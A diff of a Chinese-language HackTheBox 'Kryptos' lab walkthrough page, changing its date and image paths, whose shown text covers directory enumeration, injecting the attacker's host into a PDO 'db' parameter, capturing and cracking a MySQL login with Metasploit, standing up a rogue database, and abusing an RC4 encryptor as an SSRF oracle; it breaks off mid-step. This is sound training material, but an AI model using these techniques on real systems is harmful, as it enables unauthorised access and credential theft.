@@ -178,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">2020-12-12&nbsp;&nbsp;15:35:28</a>
+                        Date: <a href="#">2020-12-20&nbsp;&nbsp;15:35:28</a>
                         </span>
                     
                     
@@ -187,7 +187,7 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/0.png" alt="0"></p>
+            <p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/0.png" alt="0"></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>靶机信息：<a href="https://www.hackthebox.eu/home/machines/profile/183" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/183</a></p>
 <p>靶机地址：10.10.10.129</p>
 <p>攻击机地址：因为学习这个靶机花费的时间比较长，所以期间ip地址发生了几次变化，分别是：</p>
@@ -208,23 +208,23 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">╭─root@vultr ~ </span><br><span class="line">╰─# gobuster dir -u http://10.10.10.129 -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,php,pdf,html</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.129</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php,pdf</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/12/03 12:58:33 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/dev (Status: 403)</span><br><span class="line">/logout.php (Status: 302)</span><br><span class="line">/url.php (Status: 200)</span><br><span class="line">/aes.php (Status: 200)</span><br><span class="line">/encrypt.php (Status: 302)</span><br><span class="line">/rc4.php (Status: 200)</span><br><span class="line">/decrypt.php (Status: 302)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2020/12/03 13:03:22 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
 
 <p>存在目录<code>/css</code>和<code>/dev</code>，前者应该是存放css文件的，访问 <a href="http://10.10.10.129/dev" target="_blank" rel="noopener">http://10.10.10.129/dev</a> 提示权限不够：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/3.png" alt="3"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/3.png" alt="3"></p>
 <p>还有这些<code>.php</code>页面，访问<code>url.php</code>，<code>aes.php</code>和<code>rc4.php</code>都是空白页面，没有回显；访问<code>encrypt.php</code>和<code>decrypt.php</code>则会被重定向至<code>index.php</code>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;url.php (Status: 200)</span><br><span class="line">&#x2F;aes.php (Status: 200)</span><br><span class="line">&#x2F;encrypt.php (Status: 302)</span><br><span class="line">&#x2F;rc4.php (Status: 200)</span><br><span class="line">&#x2F;decrypt.php (Status: 302)</span><br></pre></td></tr></table></figure>
 
 <p>访问<a href="http://10.10.10.129/index.php" target="_blank" rel="noopener">http://10.10.10.129/index.php</a> ，是一个登录界面：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/1.png" alt="1"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/1.png" alt="1"></p>
 <p>因为不知道账号和密码，所以直接先上burp fuzz，抓到的包有四个参数<code>username</code>，<code>password</code>，<code>db</code>以及<code>token</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/6.png" alt="6"></p>
-<p>先对<code>username</code>和<code>password</code>进行fuzz：<br><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/4.png" alt="4"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/6.png" alt="6"></p>
+<p>先对<code>username</code>和<code>password</code>进行fuzz：<br><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/4.png" alt="4"></p>
 <p>结果发现<code>token</code>是不可重用的，每次请求的token都会重新生成，目的应该是anti-CSRF：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/5.png" alt="5"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/5.png" alt="5"></p>
 <p>右键查看源码：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/2.png" alt="2"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/2.png" alt="2"></p>
 <p>我们知道的是，每次请求的token都是新的值，每次提交，token都会改变，但是<code>db</code>不会改变，所以尝试改变下<code>db</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/8.png" alt="8"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/8.png" alt="8"></p>
 <p>结果返回<code>PDOException code: 1044</code>，说明使用<strong>PDO</strong>作为数据库的查询接口，1044状态码则是 Access denied导致的：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/9.png" alt="9"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/9.png" alt="9"></p>
 <h3 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h3><p>PDO全称<strong>PHP Data Objects</strong>，先看一下官方对PDO的简介：</p>
 <blockquote>
 <p><code>PHP 数据对象</code> （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。 注意利用 PDO 扩展自身并不能实现任何数据库功能；必须使用一个 <a href="https://www.php.net/manual/zh/pdo.drivers.php" target="_blank" rel="noopener">具体数据库的 PDO 驱动</a> 来访问数据库服务。</p>
@@ -274,19 +274,19 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db=cryptor;host=10.10.14.6;port=3306</span><br></pre></td></tr></table></figure>
 
 <p>然后请求，burp抓包，为了方便起见，修改下burp的参数，这样每次抓包就不用手动修改<code>db</code>参数了：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/17.png" alt="17"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/17.png" alt="17"></p>
 <p>在攻击机kali上监听本地端口<code>3306</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/12.png" alt="12"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/12.png" alt="12"></p>
 <p>可以看到返回的是<code>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.129] 34662</code>，这说明目标服务器确实在尝试联系我们的攻击机3306端口（ps：这里ip地址改变是因为htb使用的openvpn给我重新分配了地址，后面还会发生变化，但是都是10.10.14.xx）。</p>
 <p>停止监听后，返回状态码<code>2006</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/13.png" alt="13"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/13.png" alt="13"></p>
 <p>查阅官方手册，状态码2006表示mysql 服务被关闭了，和我们的测试情况保持一致：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error number: 2006; Symbol: CR_SERVER_GONE_ERROR;</span><br><span class="line">Message: MySQL server has gone away</span><br></pre></td></tr></table></figure>
 
 <h4 id="auxiliary-server-capture-mysql"><a href="#auxiliary-server-capture-mysql" class="headerlink" title="auxiliary/server/capture/mysql"></a>auxiliary/server/capture/mysql</h4><p>在metasploit中存在一个模块<code>auxiliary/server/capture/mysql</code>，可以捕获mysql的流量信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/capture/mysql</span><br><span class="line">msf5 auxiliary(server/capture/mysql) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/capture/mysql):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                           Required  Description</span><br><span class="line">   ----        ---------------                           --------  -----------</span><br><span class="line">   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format</span><br><span class="line">   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge</span><br><span class="line">   JOHNPWFILE                                            no        The prefix to the local filename to store the hashes in JOHN format</span><br><span class="line">   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     3306                                      yes       The local port to listen on.</span><br><span class="line">   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response</span><br><span class="line">   SSL         false                                     no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name     Description</span><br><span class="line">   ----     -----------</span><br><span class="line">   Capture</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/14.gif" alt="14"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/14.gif" alt="14"></p>
 <p><code>auxiliary/server/capture/mysql</code>模块捕获到的信息是challenge和response：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user: dbuser</span><br><span class="line">Challenge: 112233445566778899aabbccddeeff1122334455</span><br><span class="line">Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d</span><br><span class="line">Database: cryptor</span><br></pre></td></tr></table></figure>
 
@@ -304,12 +304,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: mysql</span><br><span class="line">database_name: cryptor</span><br><span class="line">user: dbuser</span><br><span class="line">password: krypt0n1te</span><br></pre></td></tr></table></figure>
 
 <p>拿这个密码去登录站点是不行的，毕竟这只是数据库的密码。接着，在我们本地的攻击机上搭建环境，先启动本地的mysql环境：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/15.png" alt="15"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/15.png" alt="15"></p>
 <p>在本地建立数据库<code>cryptor</code>，并赋予用户<code>dbuser</code>相应的权限：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ sudo mysql -uroot -proot</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 38</span><br><span class="line">Server version: 10.3.22-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; create database cryptor;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES on cryptor.* to &#39;dbuser&#39;@&#39;%&#39; identified by &#39;krypt0n1te&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.001 sec)</span><br></pre></td></tr></table></figure>
 
 <p>重新抓包发送，但是返回状态码2002，表示连接mysql服务器失败：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/16.png" alt="16"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/16.png" alt="16"></p>
 <p>原因是因为kali攻击机仅仅监听本地的主机：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ netstat -lanp | grep 3306 </span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
 
@@ -323,11 +323,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ sudo service mysql restart</span><br><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ netstat -lanp | grep 3306                                      </span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 10.10.14.6:3306         0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
 
 <p>接着打开wireshark抓包，选择捕获网卡<code>tun0</code>的流量，<code>tun0</code>网卡对应着我的攻击ip地址10.10.14.6：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/18.png" alt="18"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/18.png" alt="18"></p>
 <p>burp抓包后再次发送：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/19.png" alt="19"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/19.png" alt="19"></p>
 <p>右键跟踪tcp流：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/20.png" alt="20"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/20.png" alt="20"></p>
 <p>捕获的流量中包含一条数据库query语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39; AND password&#x3D;&#39;21232f297a57a5a743894a0e4a801fc3&#39; ,....z.#42S02Table &#39;cryptor.users&#39; doesn&#39;t exist</span><br></pre></td></tr></table></figure>
 
@@ -346,18 +346,18 @@
 
 <p>重新提交请求，登录成功。</p>
 <h3 id="File-Decryptor"><a href="#File-Decryptor" class="headerlink" title="File Decryptor"></a>File Decryptor</h3><p>发现有两个页面，一个是<code>encrypt.php</code>，页面提示我们，只要提供文件的url就可以进行在线加密：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/21.png" alt="21"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/21.png" alt="21"></p>
 <p>另一个页面是<code>decrypt.php</code>，不同的是，这个页面还没有成形：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/22.png" alt="22"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/22.png" alt="22"></p>
 <p>回到页面<code>encrypt.php</code>，这里提供了两种加密方式<code>AES-CBC</code>和<code>RC4</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/23.png" alt="23"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/23.png" alt="23"></p>
 <p>尝试用<code>file</code>协议读取<code>/etc/passwd</code>，但是仅仅支持<code>http</code>协议：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/24.png" alt="24"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/24.png" alt="24"></p>
 <p>我在我自己的本地开启了http服务进行测试：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -c 'print("ABCDabcd"*1000);' &gt; test</span><br><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
 
 <p>尝试对<a href="http://10.10.14.6:8000/test" target="_blank" rel="noopener">http://10.10.14.6:8000/test</a> 的文件进行加密，加密选择<code>RC4</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/25.png" alt="25"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/25.png" alt="25"></p>
 <p>返回了加密结果。</p>
 <h3 id="AES-CBC-amp-RC4"><a href="#AES-CBC-amp-RC4" class="headerlink" title="AES-CBC &amp; RC4"></a>AES-CBC &amp; RC4</h3><p>在进行后续的渗透之前，先了解这两种加密模式。</p>
 <h4 id="AES-CBC"><a href="#AES-CBC" class="headerlink" title="AES-CBC"></a>AES-CBC</h4><p>AES算法，高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。  AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。 </p>
@@ -367,25 +367,25 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n abcd &gt; abcd.txt</span><br><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
 
 <p>接着进行加密，得到经过base64加密后的<code>OVyM+A==</code>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/26.png" alt="26"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/26.png" alt="26"></p>
 <p>先base64解密，然后转为16进制输出为：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n OVyM+A== | base64 -d | xxd     </span><br><span class="line">00000000: 395c 8cf8                                9\..</span><br></pre></td></tr></table></figure>
 
 <p>我们已经知道，xor加密的一个特点就是我们用key对加密后的密文再进行一次加密，就能得到原来的明文：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n OVyM+A== | base64 -d &gt; abcd_rc4</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/27.png" alt="27"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/27.png" alt="27"></p>
 <p>对密文再次加密后得到base64值<code>YWJjZA==</code>，进行解密：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/28.png" alt="28"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/28.png" alt="28"></p>
 <p>又得到了<code>abcd</code>，这里因为我用的shell是<code>zsh</code>就有点奇怪，最后的<code>%</code>其实是一个换行符，切换为bash就能正常显示：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/29.png" alt="29"></p>
-<h3 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h3><p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/30.png" alt="30"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/29.png" alt="29"></p>
+<h3 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h3><p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/30.png" alt="30"></p>
 <p>对<a href="http://127.0.0/dev" target="_blank" rel="noopener">http://127.0.0/dev</a> 加密后得到的字符串进行base64解码后，再一次进行rc4加密：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n ZB+r03k+ci4Pu/Kiqn3XlKp1CH7TRblUckQwZr0A8KEfEVBU0VfvkDeRzTN328hTffG00fElOMKyJV0bnVzFi5au9TrTwTTNmxN2+N3yQAjVUJ4jYRdzOR4P6SEDwzPdOE4TsL58zm2FybHyCwtZDhvN+htfErEIdyKGRxDNslX7uyg0FkwbdsWc+E3bS4QyPxcd8oWOBoy62bfbd49l8VH7kYGnAQ0oh3jHs+KFzv0WX2b7rW1Yx4DOfSvsoyUAhpxz2um17Y0r1wyVujCWYRYTnmUM1B+O4rOhISbCOht4PS6q3X/VvFXTstYToUMj7CYvLWWtVn5/IVizj+x5yqHFTuSfkC7R4KPTw+BZkHV9s2RuRpIpPiK+EW29C7lFwPPyhRoe73piDn8wJLC9MA==| base64 -d &gt; dev_rc4</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/31.png" alt="31"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/31.png" alt="31"></p>
 <p>对其进行再一次rc4加密：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/32.png" alt="32"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/32.png" alt="32"></p>
 <p>base64解码后得到：</p>
